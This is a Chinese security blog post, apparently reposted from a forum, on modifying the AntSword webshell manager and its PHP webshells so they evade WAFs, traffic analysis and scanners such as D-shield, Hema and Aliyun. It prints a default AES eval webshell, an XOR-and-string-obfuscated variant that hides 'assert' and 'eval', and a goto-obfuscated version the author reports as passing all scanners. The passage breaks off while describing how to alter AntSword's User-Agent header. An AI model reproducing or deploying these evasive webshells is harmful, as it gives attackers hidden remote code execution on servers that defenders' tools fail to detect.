---
title: webshell免杀-从0改造你的AntSword
url: https://www.secpulse.com/archives/192415.html
source: 安全脉搏
date: 2022-11-29
fetch_date: 2025-10-03T23:56:24.859039
---

# webshell免杀-从0改造你的AntSword

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# webshell免杀-从0改造你的AntSword

[Web安全](https://www.secpulse.com/archives/category/articles/web)

[潇湘信安](https://www.secpulse.com/newpage/author?author_id=37983)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng3.png)

2022-11-28

18,023

|  |
| --- |
| **声明：**该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。  请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。 |

文章来源：奇安信攻防社区（用户773616194）

原文地址：https://forum.butian.net/share/1996

**0x00 前言**

为什么会有改造蚁剑的想法，之前看到有做冰蝎的流量加密，来看到绕过waf，改造一些弱特征，通过流量转换，跳过密钥交互。

但是，冰蝎需要反编译去改造源码，再进行修复bug，也比较复杂。而AntSword相对于冰蝎来说，不限制webshell，即一句话也可以进行连接，还可以自定义编码器和解码器，可以很容易让流量做到混淆。

**0x01 蚁剑介绍及其改编**

关于蚁剑的介绍，这里就不多说了，一个连接webshell的管理器，使用前端nodejs进行编码。AntSword给我最大的好处是可以连接一句话木马，而且可以自定义编码器和解码器。这让我们就有了很多种webshell的变换。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192415-1669623754.png)

但是，蚁剑默认的编码器和菜刀都是一样的，这里用burpsuite来进行抓包看下流量。

####

#### **蚁剑默认流量**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192415-1669623756.png)

返回来的是默认蚁剑的默认流量，所以的话，这里就基本上过不去态势感知和waf，所以很容易想到了编码器和解码器的选择，可以进行流量的改造来进行waf的绕过，先选用最默认的base64进行测试。

#### **默认的base64编码器**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192415-1669623760.png)

但是看到了使用base64编码之后是有eval字样的，这样的话，肯定被态势感知和全流量一体机来进行特征的抓取，肯定会报威胁。

####

#### **去github上找到蚁剑的编码器和对应的解码器**

这里下载默认的aes-128的默认流量，github地址:（编码器）。

```
https://github.com/AntSwordProject/AwesomeEncoder/tree/master/php
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192415-1669623766.png)

默认编码器的webshell

```
<?php
@session_start();
$pwd='ant';
$key=@substr(str_pad(session_id(),16,'a'),0,16);
@eval(openssl_decrypt(base64_decode($_POST[$pwd]), 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING));
?>
```

默认webshell讲解：

```
这里打开session_start，然后截取Cookie中的PHPSESSION的16位。
然后进行aes加密，密码为pwd
```

再D盾，河马和阿里云进行扫描：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192415-1669623767.png)

河马没有查出来，可能是比较弱

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192415-1669623772.png)

阿里云直接报恶意

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192415-16696237721.png)

####

#### **初步修改后的webshell：**

```
<?php
@session_start();
error_reporting(E_ALL^E_NOTICE^E_WARNING);
function decode($key,$data){
$data_new = '';
for($i=0;$i<=strlen($data);$i++){
$b=$data[$i]^$key;
$data_new = $data_new.urldecode($b);
}
define('ass',$data_new[0].strrev($data_new)[2].strrev($data_new)[2].$data_new[11].strrev($data_new)[4].strrev($data_new)[0]);
define('ev',$data_new[11].strrev($data_new)[8].$data_new[0].strrev($data_new)[6].'($result)');
return $data_new;
}
function decrypto($key,$data){
$data = base64_decode($data);
$result = openssl_decrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);
decode('\','=:=om>n?o8h9i:j;k*d0e.l/m(');
$ass=ass;
$ass(ev);
}
class run{
    public $data;
    public function __construct(){
$this->data = '#````````#'.$_POST[1]."#`#`#";
$this->data = $this->data."123456";
}
}
$key=@substr(str_pad(session_id(),16,'a'),0,16);
$run = new run();
decrypto($key,$run->data);
?>
```

这里能过去D盾，但是无法绕过阿里云查杀。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192415-1669623774.png)

所以这里还需要进行代码混淆。（这也是之后webshell免杀常常用到的）

####

#### **混淆之后的webshell：**

这里提供php在线加密的站

```
https://enphp.djunny.com/
```

这里加密之后生成webshell，如下：

```
 goto Zc4oD; UJih6: function decrypto($key, $data) { goto LBrqg; P6YrI: $ass = ass; goto aR6yN; svn0O: $result = openssl_decrypt($data, "x41x45x53x2dx31x327055105x43x42", $key, OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING); goto ATbMy; LBrqg: $data = base64_decode($data); goto svn0O; ATbMy: decode("x5c", "7572x3d157x6dx3ex6ex3fx6fx38x6871151x3ax6ax3bx6bx2ax64x30x6556x6c5715550"); goto P6YrI; aR6yN: $ass(ev); goto k6RVH; k6RVH: } goto DGZMG; WvjFi: ini_set("144151x73160x6cx61x79x5f145162x72x6f162x73", "117146x66"); goto Wguwk; DGZMG: class run { public $data; public function __construct() { $this->data = "43140x60140140x60140x60x6043" . $_POST[1] . "x23140x2314043"; } } goto Berxy; UUYvT: $run = new run(); goto apKNY; Berxy: $key = @substr(str_pad(session_id(), 16, "141"), 0, 16); goto UUYvT; Zc4oD: @session_start(); goto WvjFi; Wguwk: function decode($key, $data) { goto LGJR3; Ef77S: $i = 0; goto KvZGg; rSTXM: define("141x73x73", $data_new[0] . strrev($data_new)[2] . strrev($data_new)[2] . $data_new[11] . strrev($data_new)[4] . strrev($data_new)[0]); goto TQ6r4; Tbglr: return $data_new; goto FsE2S; tm2qt: goto I39OV; goto eF7jG; AqTZZ: $data_new = $data_new . urldecode($b); goto FriN_; TQ6r4: define("x65166", $data_new[11] . strrev($data_new)[8] . $data_new[0] . strrev($data_new)[6] . "50x24x72145163165154x7451"); goto Tbglr; FriN_: bLexq: goto gITff; eF7jG: RuTl1: goto rSTXM; gITff: $i++; goto tm2qt; KdSCg: if (!($i <= strlen($data))) { goto RuTl1; } goto d9N4J; d9N4J: $b = $data[$i] ^ $key; goto AqTZZ; LGJR3: $data_new = ''; goto Ef77S; KvZGg: I39OV: goto KdSCg; FsE2S: } goto UJih6; apKNY: decrypto($key, $run->data);
```

经过加密之后，可以发现，进行了goto的混淆，所以这里就达到了代码混淆。因为之前绕过了D盾和河马，这里直接去阿里云查杀。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192415-1669623775.png)

已经成功绕过阿里云查杀。用burpsuite抓下流量特征。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192415-1669623778.png)

从流量加密来分析的话，已经能绕过态势感知和全流量分析机。

###

### **蚁剑UA头的修改：**

####

#### 在burp的数据包中能清楚的看到蚁剑的特征

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-192415-1669623780.png)

####

#### 在目录/modules/request....